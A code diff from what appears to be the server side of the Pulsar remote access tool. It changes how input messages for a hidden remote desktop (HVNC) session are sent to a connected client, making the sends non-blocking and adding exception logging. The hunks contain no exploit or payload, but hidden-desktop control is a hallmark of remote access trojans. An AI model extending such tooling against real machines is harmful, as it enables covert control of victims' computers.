@@ -295,10 +295,18 @@ namespace Pulsar.Server.Controls
                     long IwParam = wParam.ToInt64();
                     long IlParam = lParam.ToInt64();
 
-                    Task.Run(() =>
+                    Task.Run(() => // Fire and forget for network send
                     {
-                        client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
-                    }).Wait();
+                        try
+                        {
+                            client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
+                        }
+                        catch (Exception ex)
+                        {
+                            // Log or handle exceptions from the background task if necessary
+                            System.Diagnostics.Debug.WriteLine($"Error sending HVNC input: {ex.Message}");
+                        }
+                    });
                     break;
 
                 case 0x0302:
@@ -344,17 +352,26 @@ namespace Pulsar.Server.Controls
                     }
                     try
                     {
-                        Imsg = (long)msg;
-                        IwParam = wParam.ToInt64();
-                        IlParam = lParam.ToInt64();
-                        Task.Run(() =>
+                        long currentMsg = (long)msg; // Capture variables for the closure
+                        long currentWParam = wParam.ToInt64();
+                        long currentLParam = lParam.ToInt64();
+                        Task.Run(() => // Fire and forget
                         {
-                            client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
-                        }).Wait();
+                            try
+                            {
+                                client.Send(new DoHVNCInput { msg = (uint)currentMsg, wParam = (int)currentWParam, lParam = (int)currentLParam });
+                            }
+                            catch (Exception ex)
+                            {
+                                // Log or handle exceptions from the background task
+                                System.Diagnostics.Debug.WriteLine($"Error sending HVNC input: {ex.Message}");
+                            }
+                        });
                         break;
                     }
-                    catch
+                    catch (Exception ex_outer) // Catch potential exceptions from preparing the task
                     {
+                        System.Diagnostics.Debug.WriteLine($"Error preparing to send HVNC input: {ex_outer.Message}");
                         break;
                     }
             }
